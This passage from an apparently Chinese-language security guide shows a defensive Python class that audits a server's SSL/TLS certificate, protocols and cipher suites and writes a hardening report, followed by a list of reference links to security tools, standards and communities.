    def evaluate_key_strength(self, bits):
        """评估密钥强度"""
        if bits >= 256:
            return 'Strong'
        elif bits >= 128:
            return 'Medium'
        else:
            return 'Weak'
    
    def check_certificate_chain(self):
        """检查证书链"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            
            with socket.create_connection((self.hostname, self.port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.hostname) as ssock:
                    # 获取证书链
                    cert_der = ssock.getpeercert(binary_form=True)
                    cert_pem = ssl.DER_cert_to_PEM_cert(cert_der)
                    
                    chain_info = {
                        'chain_valid': True,
                        'hostname_matches': ssock.getpeercert()['subjectAltName'] if 'subjectAltName' in ssock.getpeercert() else False
                    }
                    
                    self.results['certificate_chain'] = chain_info
                    return chain_info
                    
        except Exception as e:
            self.results['certificate_chain'] = {
                'chain_valid': False,
                'error': str(e)
            }
            return None
    
    def check_vulnerabilities(self):
        """检查已知漏洞"""
        vulnerabilities = []
        
        # 检查不安全的协议
        if 'protocols' in self.results:
            for protocol, info in self.results['protocols'].items():
                if protocol in ['SSLv2', 'SSLv3', 'TLSv1.0', 'TLSv1.1'] and info.get('supported', False):
                    vulnerabilities.append({
                        'type': 'Insecure Protocol',
                        'protocol': protocol,
                        'severity': 'High' if protocol in ['SSLv2', 'SSLv3'] else 'Medium',
                        'description': f"支持不安全的协议 {protocol}"
                    })
        
        # 检查证书问题
        if 'certificate' in self.results:
            cert = self.results['certificate']
            
            if cert.get('is_expired', False):
                vulnerabilities.append({
                    'type': 'Expired Certificate',
                    'severity': 'High',
                    'description': '证书已过期'
                })
            
            if cert.get('key_size', 0) < 2048:
                vulnerabilities.append({
                    'type': 'Weak Key',
                    'severity': 'Medium',
                    'description': f"证书密钥长度过小: {cert.get('key_size')} bits"
                })
            
            if cert.get('days_until_expiry', 0) < 30:
                vulnerabilities.append({
                    'type': 'Certificate Expiring Soon',
                    'severity': 'Medium',
                    'description': f"证书将在 {cert.get('days_until_expiry')} 天后过期"
                })
            
            if cert.get('is_self_signed', False):
                vulnerabilities.append({
                    'type': 'Self-Signed Certificate',
                    'severity': 'Medium',
                    'description': '使用自签名证书'
                })
        
        # 检查加密套件
        if 'cipher_suites' in self.results:
            cipher = self.results['cipher_suites']
            if not cipher.get('is_recommended', False):
                vulnerabilities.append({
                    'type': 'Weak Cipher Suite',
                    'severity': 'Medium',
                    'description': f"使用不推荐的加密套件: {cipher.get('current_cipher', {}).get('name', 'Unknown')}"
                })
        
        self.results['vulnerabilities'] = vulnerabilities
        return vulnerabilities
    
    def generate_report(self):
        """生成安全检查报告"""
        report = f"SSL/TLS安全检查报告\n"
        report += f"目标: {self.hostname}:{self.port}\n"
        report += "=" * 60 + "\n\n"
        
        # 证书信息
        if 'certificate' in self.results:
            cert = self.results['certificate']
            report += "证书信息:\n"
            report += f"  主题: {cert.get('subject', {}).get('commonName', 'N/A')}\n"
            report += f"  颁发者: {cert.get('issuer', {}).get('commonName', 'N/A')}\n"
            report += f"  有效期: {cert.get('not_before', 'N/A')} 至 {cert.get('not_after', 'N/A')}\n"
            report += f"  剩余天数: {cert.get('days_until_expiry', 'N/A')}\n"
            report += f"  密钥长度: {cert.get('key_size', 'N/A')} bits\n"
            report += f"  自签名: {'是' if cert.get('is_self_signed', False) else '否'}\n\n"
        
        # 协议支持
        if 'protocols' in self.results:
            report += "协议支持:\n"
            for protocol, info in self.results['protocols'].items():
                status = "支持" if info.get('supported', False) else "不支持"
                report += f"  {protocol}: {status}\n"
            report += "\n"
        
        # 加密套件
        if 'cipher_suites' in self.results:
            cipher = self.results['cipher_suites']
            if 'current_cipher' in cipher:
                current = cipher['current_cipher']
                report += "当前加密套件:\n"
                report += f"  名称: {current.get('name', 'N/A')}\n"
                report += f"  版本: {current.get('version', 'N/A')}\n"
                report += f"  密钥长度: {current.get('bits', 'N/A')} bits\n"
                report += f"  推荐度: {'推荐' if cipher.get('is_recommended', False) else '不推荐'}\n\n"
        
        # 漏洞
        if 'vulnerabilities' in self.results:
            vulnerabilities = self.results['vulnerabilities']
            if vulnerabilities:
                report += "发现的安全问题:\n"
                for i, vuln in enumerate(vulnerabilities, 1):
                    report += f"  {i}. {vuln['type']} ({vuln['severity']})\n"
                    report += f"     {vuln['description']}\n"
                report += "\n"
            else:
                report += "未发现明显的安全问题\n\n"
        
        # 建议
        report += "安全建议:\n"
        
        if 'protocols' in self.results:
            insecure_protocols = [p for p in ['SSLv2', 'SSLv3', 'TLSv1.0', 'TLSv1.1'] 
                                if self.results['protocols'].get(p, {}).get('supported', False)]
            if insecure_protocols:
                report += "  - 禁用不安全的协议: " + ", ".join(insecure_protocols) + "\n"
        
        if 'certificate' in self.results:
            cert = self.results['certificate']
            if cert.get('key_size', 0) < 2048:
                report += "  - 使用至少2048位的RSA密钥\n"
            if cert.get('days_until_expiry', 0) < 30:
                report += "  - 更新即将过期的证书\n"
        
        report += "  - 启用HSTS\n"
        report += "  - 使用强加密套件\n"
        report += "  - 定期检查证书状态\n"
        
        return report
    
    def run_full_check(self):
        """运行完整的安全检查"""
        print(f"开始检查 {self.hostname}:{self.port} 的SSL/TLS配置...")
        
        self.check_certificate()
        self.check_protocols()
        self.check_cipher_suites()
        self.check_certificate_chain()
        self.check_vulnerabilities()
        
        print("检查完成!")
        return self.results

# 使用示例
# checker = SSLTLSChecker("example.com", 443)
# results = checker.run_full_check()
# report = checker.generate_report()
# print(report)
```

## 参考资源

### 网络安全工具
- [Nmap Official Guide](https://nmap.org/docs.html)
- [Metasploit Framework](https://www.metasploit.com/)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [OWASP ZAP](https://www.zaproxy.org/docs/)
- [Wireshark User Guide](https://www.wireshark.org/docs/wsug_html_chunked/)

### 安全标准框架
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [ISO/IEC 27001](https://www.iso.org/isoiec-27001-information-security.html)
- [CIS Controls](https://www.cisecurity.org/cis-controls/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

### 渗透测试资源
- [Penetration Testing Execution Standard (PTES)](http://www.pentest-standard.org/)
- [OSSTMM (Open Source Security Testing Methodology Manual)](https://www.isecom.org/research/osstmm.html)
- [Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

### 漏洞数据库
- [CVE (Common Vulnerabilities and Exposures)](https://cve.mitre.org/)
- [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
- [Exploit Database](https://www.exploit-db.com/)
- [Vulnerability Scoring System (CVSS)](https://www.first.org/cvss/)

### 安全社区
- [Reddit r/netsec](https://www.reddit.com/r/netsec/)
- [Security Stack Exchange](https://security.stackexchange.com/)
- [OWASP Community](https://owasp.org/)
- [SANS Institute](https://www.sans.org/)
